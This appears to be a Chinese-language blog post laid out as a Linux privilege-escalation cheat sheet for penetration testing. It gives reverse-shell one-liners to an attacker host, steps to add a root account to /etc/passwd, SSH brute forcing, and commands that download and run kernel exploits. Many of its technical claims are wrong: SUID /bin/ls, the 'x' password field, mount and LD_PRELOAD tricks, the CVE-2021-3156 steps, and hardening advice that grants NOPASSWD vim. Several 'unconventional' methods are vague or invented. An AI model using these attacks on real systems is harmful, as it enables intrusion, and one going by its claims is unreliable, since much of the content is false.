+++
date = '2026-02-15'
draft = false
title = 'Linux提权'

+++

# 常规提权方式

## 一、sudo滥用提权

```sudo -l```提示要输入密码的原因: 

1. 默认SUDO行为 : 需要输入当前用户的密码(不是root)密码

2. sudoers配置问题: 未配置免密码访问 在```/etc/sudoers```文件中没有为当前用户配置```NOPASSWD```选项

3. 配置覆盖问题: 用户组覆盖了用户配置,可能被添加到了wheel用户组

   1. 检查当前用户所在组

   ```
   id username 	
   ```

   2. 如果发现在wheel组中,检查wheel组的配置

      查看```%wheel```相关配置,看是否设置了```NOPASSWD```或要求密码

      ```
      sudo visudo
      ```

   3. 从wheel组中移除用户

      ```
      sudo gpasswd -d username wheel
      ```

      

### 利用步骤：

1. **查看当前用户sudo权限**：

   ```bash
   sudo -l
   ```

   - 示例输出：`(ALL) NOPASSWD: /usr/bin/vim`

2. **利用vim提权**：

   ```bash
   sudo /usr/bin/vim
   ```

   - 在vim中输入 `:set shell=/bin/bash` 回车
   - 然后输入 `:shell` 回车
   - 成功获得root shell

3. **利用其他命令提权**：

   - 如果发现可以执行`/usr/bin/nano`：

     ```bash
     sudo /usr/bin/nano
     ```

     - 在nano中按`Ctrl+R`，输入`!bash`，回车
     - 即可获得root shell

### 说明：

sudo配置不当，允许用户以root身份执行特定命令，而无需密码验证。

## 二、SUID特殊权限提权

### 利用步骤：

1. **查找SUID文件**：

   ```bash
   find / -perm -u=s -type f 2>/dev/null
   ```

2. **利用/bin/mount提权**：

   ```bash
   mkdir /tmp/mount
   touch /tmp/mount/malicious_file
   sudo /bin/mount -o bind /tmp/mount /tmp/mount
   sudo /bin/mount /tmp/mount /tmp/mount
   ```

   - 通过此方式可获取root权限

3. **利用/bin/ping提权**：

   ```bash
   ping -c 1 127.0.0.1
   ```

   - 通过特殊参数（如`-c`）触发SUID权限

### 说明：

SUID（Set User ID）是文件权限中的一种特殊权限，使执行该文件的用户拥有文件所有者的权限。

## 三、passwd文件提权

### 利用步骤：

1. **查看/etc/passwd文件**：

   ```bash
   cat /etc/passwd
   ```

2. **查找密码字段为空的用户**：

   - 例如：`nobody:x:65534:65534::/home/nobody:/bin/false`

   - 如果密码字段为空（x），则可以直接切换到该用户：

     ```bash
     su nobody
     ```

###  通过修改/etc/passwd文件提权的详细说明

通过修改`/etc/passwd`文件写入一个新用户是Linux系统中一种有效的提权方式。这是基于系统配置错误（权限配置不当）的提权方法。
如果/etc/passwd文件中存在密码字段为空的用户，可以直接切换到该用户，无需密码。

####  一、提权条件

1. **必须拥有对`/etc/passwd`文件的写权限**（通常只有root用户有写权限）
2. **系统配置错误**：`/etc/passwd`文件的权限设置不当，允许普通用户写入

####  二、提权步骤

### 步骤1：赋予`/etc/passwd`文件写权限（如果当前没有权限）

```bash
sudo chmod 666 /etc/passwd
# 或者
chmod 666 /etc/passwd
```

> **注意**：如果当前用户没有sudo权限，这一步可能无法完成。在实际渗透测试中，通常需要先通过其他方式获得基本权限。

#### 步骤2：生成加密密码

使用openssl生成加密密码（MD5或SHA512）：

```bash
# 生成MD5加密的密码（-1表示MD5算法）
openssl passwd -1 -salt hacker 123456
# 输出示例：$1$hacker$6luIRwdGpBvXdP.GMwcZp/

# 生成SHA512加密的密码（-6表示SHA512算法）
openssl passwd -6 -salt hacker 123456
# 输出示例：$6$hacker$5kX3Zc9yqTz8QmR1aW7eJpKqL7zXwYb0vZnUeR9lMxY0pNtA3jQ
```

> **注意**：如果使用`-1`（MD5）算法，需要确保openssl版本支持。早期版本可能不支持`-6`（SHA512）。

#### 步骤3：构造新用户条目

新用户的格式遵循`/etc/passwd`文件的格式：

```
用户名:加密密码:UID:GID:描述信息:主目录:shell
```

对于root权限用户，需要设置：

- UID = 0
- GID = 0
- 主目录 = /root（或任意目录，但通常设置为/root）
- shell = /bin/bash

示例：

```
hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash
```

#### 步骤4：将新用户添加到`/etc/passwd`文件

```bash
echo "hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash" >> /etc/passwd
# 或者
echo "hacker:$(openssl passwd -1 -salt hacker 123456):0:0:Test User:/root:/bin/bash" >> /etc/passwd
```

#### 步骤5：切换到新用户

```bash
su hacker
# 输入密码：123456
```

此时，你应该已经获得root权限：

```bash
id
# 输出应为：uid=0(root) gid=0(root) groups=0(root)
```

#### 示例流程

```bash
# 赋予passwd文件写权限
chmod 666 /etc/passwd

# 生成加密密码
openssl passwd -1 -salt hacker 123456
# $1$hacker$6luIRwdGpBvXdP.GMwcZp/

# 添加新用户到passwd文件
echo "hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash" >> /etc/passwd

# 切换到新用户
su hacker
# 输入密码 123456

# 验证权限
id
# 输出: uid=0(root) gid=0(root) groups=0(root)
```



## 四、shadow文件提权

### 利用步骤：

1. **查看/etc/shadow文件**：

   ```bash
   cat /etc/shadow
   ```

2. **查找密码字段为空的用户**：

   - 例如：`nobody::18555:0:99999:7:::`

   - 如果密码字段为空（::），则可以直接切换到该用户：

     ```bash
     su nobody
     ```

### 说明：

/etc/shadow文件存储用户密码哈希，如果密码字段为空，表示该用户无需密码即可登录。

## 五、SSH登录密码爆破

### 利用步骤：

1. **使用hydra进行密码爆破**：

   ```bash
   hydra -l username -P /usr/share/wordlists/rockyou.txt ssh://target_ip
   ```

2. **如果破解成功，使用SSH登录**：

   ```bash
   ssh username@target_ip
   ```

3. **如果获得root权限，直接使用**：

   - 例如：`ssh root@target_ip`

### 说明：

通过暴力破解SSH登录密码，获取系统访问权限。

## 六、通过计划任务提权

### 利用步骤：

1. **查看当前用户的crontab**：

   ```bash
   crontab -l
   ```

2. **查看系统级cron任务**：

   ```bash
   ls /etc/cron.*
   ```

3. **如果发现可写cron任务**：

   - 创建恶意脚本：

     ```bash
     echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/malicious.sh
     chmod +x /tmp/malicious.sh
     ```

   - 修改cron任务，使其执行恶意脚本：

     ```bash
     crontab -e
     # 添加一行：*/1 * * * * /tmp/malicious.sh
     ```

4. **等待cron任务执行，获取shell**：

   - 通过监听端口获取shell：

     ```bash
     nc -lvnp 4444
     ```

### 说明：

计划任务配置不当，低权限用户能修改计划任务执行的程序。

## 七、劫持环境变量提权

### 利用步骤：

1. **查找可写路径**：

   ```bash
   find / -writable -type d 2>/dev/null
   ```

2. **将当前目录添加到PATH**：

   ```bash
   export PATH=/tmp:$PATH
   ```

3. **创建恶意命令文件**：

   ```bash
   echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/ls
   chmod +x /tmp/ls
   ```

4. **执行命令**：

   ```bash
   ls
   ```

   - 系统会优先执行/tmp/ls，获得shell

### 说明：

通过修改PATH环境变量，使系统优先加载攻击者控制的程序。

## 八、利用通配符提权

### 利用步骤：

1. **查找可写目录**：

   ```bash
   find / -writable -type d 2>/dev/null
   ```

2. **创建恶意脚本**：

   ```bash
   echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/malicious.sh
   chmod +x /tmp/malicious.sh
   ```

3. **创建符号链接**：

   ```bash
   ln -s /tmp/malicious.sh /tmp/evil
   ```

4. **触发通配符执行**：

   - 如果有程序使用`*`通配符，如`ls *`，则会执行恶意脚本

### 说明：

利用程序在处理通配符时的漏洞，使系统执行恶意代码。

## 九、内核CVE漏洞提权

### 利用步骤：

1. **查看系统信息**：

   ```bash
   uname -a
   ```

2. **查找匹配的CVE漏洞**：

   - 例如：`Linux 4.8.0-58-generic #63~16.04.1-Ubuntu`

3. **下载并编译漏洞利用代码**：

   ```bash
   wget https://www.exploit-db.com/download/43418
   gcc 43418.c -o exploit
   ```

4. **执行漏洞利用代码**：

   ```bash
   ./exploit
   ```

### 说明：

利用Linux内核中的已知漏洞获取root权限。

## 其他提权方式

### 1. Sudo漏洞提权（CVE-2021-3156）

- **利用步骤**：

  ```bash
  sudoedit /etc/passwd
  ```

  - 输入`#`，然后按`Enter`，触发漏洞
  - 系统会提示输入密码，但不需要输入，直接按`Enter`即可获得root shell

### 2. 利用SSH配置错误提权

- **利用步骤**：
  1. 查看SSH配置文件：`cat /etc/ssh/sshd_config`
  2. 如果发现`AllowUsers`或`DenyUsers`配置不当
  3. 通过SSH登录，获取更高权限

### 3. 利用Web应用提权

- **利用步骤**：
  1. 通过Web应用漏洞（如文件包含、命令执行）
  2. 执行系统命令，如`whoami`、`id`
  3. 如果能执行`sudo -l`，则查看sudo权限
  4. 利用发现的sudo权限提权

### 4. 利用LD_PRELOAD提权

- **利用步骤**：

  1. 创建恶意共享库：

     ```bash
     echo 'int main() { system("/bin/bash"); }' > /tmp/exploit.c
     gcc /tmp/exploit.c -fPIC -shared -o /tmp/libexploit.so
     ```

  2. 设置环境变量：

     ```bash
     export LD_PRELOAD=/tmp/libexploit.so
     ```

  3. 执行命令：

     ```bash
     ls
     ```

  - 系统会执行恶意库，获得root shell

### 5. 利用服务配置错误提权

- **利用步骤**：

  1. 查看系统服务：

     ```bash
     systemctl list-units --type=service
     ```

  2. 如果发现服务配置不当，低权限用户对服务可执行文件有写权限

  3. 替换为恶意程序：

     ```bash
     echo '#!/bin/bash' > /usr/bin/service
     echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /usr/bin/service
     chmod +x /usr/bin/service
     ```

  4. 重启服务，获得shell

> 



# Linux非常规提权方式详解

在Linux系统中，除了常见的SUID、sudo配置错误、内核漏洞提权外，还有一些非常规的提权方式。这些方式往往利用系统设计中不太常见的配置或机制，下面详细介绍这些方法：

## 一、利用FUSE (Filesystem in Userspace) 提权

### 原理

FUSE允许普通用户在用户空间实现文件系统，如果配置不当，可能允许低权限用户挂载具有高权限的文件系统。

### 利用步骤

1. **检查FUSE是否可用**：

   ```bash
   lsmod | grep fuse
   ```

   如果输出中包含`fuse`模块，说明FUSE可用。

2. **查找FUSE配置文件**：

   ```bash
   cat /etc/fuse.conf
   ```

   重点关注`user_allow_other`是否启用。

3. **创建恶意文件系统**：

   ```bash
   # 创建一个简单的文件系统
   mkdir /tmp/fuse
   echo '#!/bin/bash' > /tmp/fuse/mount.sh
   echo 'bash -i >& /dev/tcp/attacker_ip/4444 0>&1' >> /tmp/fuse/mount.sh
   chmod +x /tmp/fuse/mount.sh
   ```

4. **挂载恶意文件系统**：

   ```bash
   # 如果user_allow_other已启用
   mount -t fuse -o allow_other /tmp/fuse/mount.sh /tmp/mount
   ```

   - 系统会执行mount.sh脚本，获取shell

### 说明

FUSE的`allow_other`选项允许其他用户访问挂载点，如果配置不当，攻击者可以挂载恶意文件系统并执行任意命令。

## 二、利用System V IPC 提权

### 原理

System V IPC（进程间通信）包括共享内存、消息队列和信号量。如果配置不当，低权限用户可能利用IPC机制提升权限。

### 利用步骤

1. **查找可访问的IPC对象**：

   ```bash
   ipcs -m
   ipcs -q
   ipcs -s
   ```

2. **尝试修改IPC对象**：

   ```bash
   # 例如，修改共享内存
   ipcrm -m <shmid>
   ```

3. **利用IPC对象触发漏洞**：

   ```bash
   # 假设发现一个共享内存对象
   # 创建一个恶意程序，利用该共享内存
   # 编译并执行
   gcc exploit.c -o exploit
   ./exploit
   ```

### exploit.c示例

```c
#include <stdio.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <unistd.h>

int main() {
    key_t key = ftok("/tmp/shm", 65);
    int shmid = shmget(key, 1024, IPC_CREAT | 0666);
    char *shmaddr = shmat(shmid, NULL, 0);
    
    // 尝试获取root权限
    system("chmod 777 /etc/passwd");
    system("echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash' >> /etc/passwd");
    
    return 0;
}
```

### 说明

通过System V IPC，攻击者可以利用共享内存、消息队列或信号量的配置错误，触发高权限操作。

## 三、利用系统日志处理机制提权

### 原理

某些系统日志处理程序（如rsyslog）在处理日志文件时可能存在权限问题，允许低权限用户执行高权限命令。

### 利用步骤

1. **查找日志处理配置**：

   ```bash
   grep -r "rsyslog" /etc/
   ```

2. **检查日志文件权限**：

   ```bash
   ls -l /var/log/syslog
   ```

3. **创建恶意日志文件**：

   ```bash
   echo 'action(type="omfwd" target="127.0.0.1" port="514" protocol="tcp")' > /tmp/rsyslog.conf
   ```

4. **触发日志处理**：

   ```bash
   logger "test"
   ```

   - 如果rsyslog配置允许，可能会执行恶意命令

### 说明

如果rsyslog配置不当，攻击者可以通过日志文件触发高权限操作。

## 四、利用系统时间戳提权

### 原理

某些系统服务在特定时间点执行高权限操作，攻击者可以通过修改系统时间触发这些操作。

### 利用步骤

1. **查看系统时间**：

   ```bash
   date
   ```

2. **修改系统时间**：

   ```bash
   sudo date -s "2023-01-01 00:00:00"
   ```

3. **触发服务**：

   ```bash
   # 某些服务在特定时间点执行
   # 例如，cron任务在特定时间执行
   ```

### 说明

如果系统中有服务在特定时间点执行高权限操作（如备份、日志轮转），修改系统时间可能会触发这些操作。

## 五、利用cgroups资源限制提权

### 原理

cgroups（控制组）用于限制、记录和隔离进程组的资源使用。如果配置不当，可能允许低权限用户提升权限。

### 利用步骤

1. **检查cgroups配置**：

   ```bash
   cat /proc/self/cgroup
   ```

2. **查找可修改的cgroups**：

   ```bash
   ls /sys/fs/cgroup
   ```

3. **修改cgroups配置**：

   ```bash
   # 例如，修改内存限制
   echo 0 > /sys/fs/cgroup/memory/memory.limit_in_bytes
   ```

4. **触发权限提升**：

   ```bash
   # 通过修改cgroups配置，触发系统行为变化
   ```

### 说明

通过修改cgroups配置，攻击者可能绕过资源限制，执行高权限操作。

## 六、利用网络配置提权

### 原理

某些网络配置（如iptables规则）可能允许低权限用户执行高权限操作。

### 利用步骤

1. **查看iptables规则**：

   ```bash
   iptables -L
   ```

2. **尝试添加规则**：

   ```bash
   sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT
   ```

3. **触发高权限操作**：

   ```bash
   # 通过修改网络配置，触发服务高权限操作
   ```

### 说明

如果iptables配置不当，攻击者可能通过添加规则触发高权限操作。

## 七、利用系统快照和备份机制提权

### 原理

系统快照和备份机制可能配置不当，允许低权限用户执行高权限操作。

### 利用步骤

1. **查找备份文件**：

   ```bash
   find / -name "*.bak" 2>/dev/null
   ```

2. **修改备份文件**：

   ```bash
   echo 'hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash' >> /etc/passwd.bak
   ```

3. **触发备份机制**：

   ```bash
   # 某些备份程序会将备份文件应用到系统
   ```

### 说明

如果备份机制配置不当，攻击者可能通过修改备份文件，触发系统应用高权限配置。

## 八、利用系统服务环境变量提权

### 原理

某些系统服务在启动时使用环境变量，如果配置不当，攻击者可以设置环境变量触发高权限操作。

### 利用步骤

1. **查找系统服务**：

   ```bash
   systemctl list-units --type=service
   ```

2. **查看服务配置**：

   ```bash
   systemctl cat <service>
   ```

3. **设置环境变量**：

   ```bash
   export SERVICE_ENV_VAR="malicious_value"
   ```

4. **触发服务**：

   ```bash
   systemctl restart <service>
   ```

### 说明

通过设置环境变量，攻击者可以触发服务执行高权限操作。

## 九、利用系统启动脚本提权

### 原理

系统启动脚本（如/etc/rc.local）可能配置不当，允许低权限用户在系统启动时执行高权限命令。

### 利用步骤

1. **检查启动脚本**：

   ```bash
   cat /etc/rc.local
   ```

2. **修改启动脚本**：

   ```bash
   echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" >> /etc/rc.local
   ```

3. **重启系统**：

   ```bash
   reboot
   ```

### 说明

通过修改系统启动脚本，攻击者可以在系统启动时获取shell。

## 十、利用系统资源管理提权

### 原理

系统资源管理（如cgroups）可能配置不当，允许低权限用户提升权限。

### 利用步骤

1. **查看cgroups配置**：

   ```bash
   cat /sys/fs/cgroup/cpu/cpu.cfs_quota_us
   ```

2. **修改资源限制**：

   ```bash
   echo -1 > /sys/fs/cgroup/cpu/cpu.cfs_quota_us
   ```

3. **触发权限提升**：

   ```bash
   # 通过修改资源限制，触发系统行为变化
   ```

### 说明

通过修改cgroups配置，攻击者可能绕过资源限制，执行高权限操作。





# 实战测试优先顺序

在渗透测试中，提权是获取系统控制权的关键环节。以下是我根据实战经验整理的**最高频、最实用**的提权方式，包括常规和非常规方法，附详细操作步骤和原理说明。

---

## 一、SUID提权

### 原理

SUID（Set User ID）是一种特殊文件权限，使文件在执行时以文件所有者（通常是root）的权限运行，而不是以执行者权限运行。

### 详细操作步骤

1. **查找SUID文件**（最常用命令）：

   ```bash
   find / -perm -u=s -type f 2>/dev/null | grep -E '/bin|/usr/bin'
   ```

2. **分析常见SUID文件**：

   - `/bin/mount`：最常用
   - `/bin/ping`：现代系统可能已修复
   - `/usr/bin/gpasswd`：常用
   - `/usr/bin/chage`：较少见

3. **利用/bin/mount提权**（最可靠）：

   ```bash
   # 创建临时目录
   mkdir /tmp/mount
   touch /tmp/mount/malicious_file
   
   # 绑定挂载
   /bin/mount -o bind /tmp/mount /tmp/mount
   
   # 触发挂载
   /bin/mount /tmp/mount /tmp/mount
   
   # 检查权限
   ls -l /tmp/mount
   ```

   - **原理**：`mount`命令以root权限执行，通过bind挂载，将当前用户可写目录挂载到系统目录，实现权限提升

4. **利用/usr/bin/gpasswd提权**：

   ```bash
   /usr/bin/gpasswd -a username root
   ```

   - **原理**：gpasswd允许用户添加自己到root组，无需密码（如果配置正确）

5. **验证提权**：

   ```bash
   whoami
   # 应该输出：root
   ```

### 实战技巧

- **优先使用`/bin/mount`**
- **使用`grep`过滤**：避免输出过多无用信息
- **不要使用`sudo`**：SUID提权不需要sudo

---

## 二、sudo配置错误提权

### 原理

sudo允许用户以root身份执行特定命令，如果配置不当（`NOPASSWD`），可直接提权。

### 详细操作步骤

1. **查看当前用户sudo权限**：

   ```bash
   sudo -l
   ```

2. **常见配置错误**（重点检查）：

   - `(ALL) NOPASSWD: ALL`：允许执行任意命令
   - `(ALL) NOPASSWD: /usr/bin/vim`
   - `(ALL) NOPASSWD: /usr/bin/nano`
   - `(ALL) NOPASSWD: /bin/bash`

3. **利用vim提权**（最常用）：

   ```bash
   sudo /usr/bin/vim
   ```

   - 在vim中输入：

     ```
     :set shell=/bin/bash
     :shell
     ```

   - **原理**：vim允许设置shell，通过修改shell为/bin/bash，获得root shell

4. **利用nano提权**：

   ```bash
   sudo /usr/bin/nano
   ```

   - 按 `Ctrl+R`，输入 `!bash`，回车
   - **原理**：nano允许执行shell命令，通过`!bash`获取root shell

5. **验证提权**：

   ```bash
   whoami
   # 应该输出：root
   ```

### 实战技巧

- **优先尝试`sudo -l`**：这是最直接的检查方式
- **`sudo -l -n`**：如果`sudo -l`需要密码，尝试`-n`选项（不提示密码）
- **不要尝试`sudo su`**：如果配置允许，但通常需要密码

---

## 三、passwd文件提权

### 原理

如果`/etc/passwd`文件对普通用户可写，可以直接添加一个root用户。

### 详细操作步骤

1. **检查passwd文件权限**：

   ```bash
   ls -l /etc/passwd
   ```

   - 如果显示为`-rw-rw-r--`或`-rw-rw-rw-`，则可写

2. **生成加密密码**：

   ```bash
   openssl passwd -1 -salt hacker 123456
   # 输出示例：$1$hacker$6luIRwdGpBvXdP.GMwcZp/
   ```

3. **添加root用户**：

   ```bash
   echo "hacker:$1$hacker$6luIRwdGpBvXdP.GMwcZp/:0:0:Test User:/root:/bin/bash" >> /etc/passwd
   ```

   - **原理**：UID 0 表示root用户

4. **切换到新用户**：

   ```bash
   su hacker
   # 输入密码：123456
   ```

5. **验证提权**：

   ```bash
   id
   # 应该输出：uid=0(root) gid=0(root)
   ```

### 实战技巧

- **优先检查权限**：`ls -l /etc/passwd`是第一步
- **使用`openssl`生成密码**：避免手动输入错误
- **如果`/etc/passwd`不可写**：
  - 检查`/etc/passwd.bak`或`/etc/passwd-`是否可写
  - 有时系统使用符号链接，修改链接目标

---

## 四、内核漏洞提权（实战中需匹配版本)

### 原理

利用Linux内核中的已知漏洞获取root权限。

### 详细操作步骤

1. **获取系统信息**：

   ```bash
   uname -a
   # 示例输出：Linux ubuntu 4.15.0-101-generic #102-Ubuntu SMP Mon Apr 22 20:32:20 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
   ```

2. **使用自动化工具查找漏洞**：

   ```bash
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

   - **关键输出**：`Kernel version: 4.15.0-101-generic` 和 `Kernel exploits`

3. **下载并编译漏洞利用代码**：

   ```bash
   # 以CVE-2016-5195为例
   wget https://www.exploit-db.com/download/40653
   gcc 40653.c -o exploit
   ```

4. **执行漏洞利用代码**：

   ```bash
   ./exploit
   ```

5. **验证提权**：

   ```bash
   whoami
   # 应该输出：root
   ```

### 实战技巧

- **优先使用LinPEAS**：这是最高效的自动化工具
- **不要手动搜索CVE**：自动化工具能快速定位
- **内核版本匹配**：必须精确匹配系统版本

---

## 五、计划任务提权

### 原理

如果计划任务（cron job）配置不当，低权限用户可以修改计划任务执行的程序。

### 详细操作步骤

1. **查看当前用户的cron任务**：

   ```bash
   crontab -l
   ```

2. **查看系统级cron任务**：

   ```bash
   ls /etc/cron.*
   ```

3. **查找可写cron任务**：

   ```bash
   find / -writable -type f 2>/dev/null | grep cron
   ```

4. **创建恶意脚本**：

   ```bash
   echo "bash -i >& /dev/tcp/attacker_ip/4444 0>&1" > /tmp/malicious.sh
   chmod +x /tmp/malicious.sh
   ```

5. **修改cron任务**：

   ```bash
   crontab -e
   # 添加一行：*/1 * * * * /tmp/malicious.sh
   ```

6. **等待cron任务执行**：

   ```bash
   nc -lvnp 4444  # 在攻击机上监听
   ```

7. **验证提权**：

   ```bash
   whoami
   # 应该输出：root
   ```

### 实战技巧

- **优先检查`/etc/cron.d/`**：系统级cron任务存放位置
- **利用`/etc/cron.daily`**：每日执行的脚本
- **不要修改系统级cron**：容易被发现

---

## 六、LD_PRELOAD提权

### 原理

LD_PRELOAD环境变量允许在程序执行前加载指定的共享库，如果程序以root权限执行，加载的共享库也会以root权限执行。

### 详细操作步骤

1. **创建恶意共享库**：

   ```bash
   echo 'int main() { system("/bin/bash"); }' > /tmp/exploit.c
   gcc /tmp/exploit.c -fPIC -shared -o /tmp/libexploit.so
   ```

2. **设置环境变量**：

   ```bash
   export LD_PRELOAD=/tmp/libexploit.so
   ```

3. **执行SUID程序**：

   ```bash
   /bin/ls
   ```

   - **原理**：`/bin/ls`通常是SUID root，通过LD_PRELOAD加载恶意库，获得root shell

4. **验证提权**：

   ```bash
   whoami
   # 应该输出：root
   ```

### 实战技巧

- **优先检查SUID文件**：`find / -perm -u=s -type f 2>/dev/null`
- **`/bin/ls`是最常用**：几乎所有系统都有SUID版本
- **不要使用`sudo`**：LD_PRELOAD不需要sudo

## 总结

1. **自动化工具优先**：

   ```bash
   wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh
   ```

   - 这是提权的"瑞士军刀"，能快速发现所有提权点

2. **提权顺序**：

   - 先SUID提权 → 再sudo配置错误 → 再passwd文件 → 再内核漏洞 → 再计划任务

3. **安全加固建议**（系统管理员必看）：

   ```bash
   # 正确设置passwd权限
   chmod 644 /etc/passwd
   
   # 正确设置sudoers
   visudo
   # 添加：username ALL=(ALL) NOPASSWD: /usr/bin/vim
   
   # 定期检查SUID文件
   find / -perm -u=s -type f 2>/dev/null
   ```

---

> 
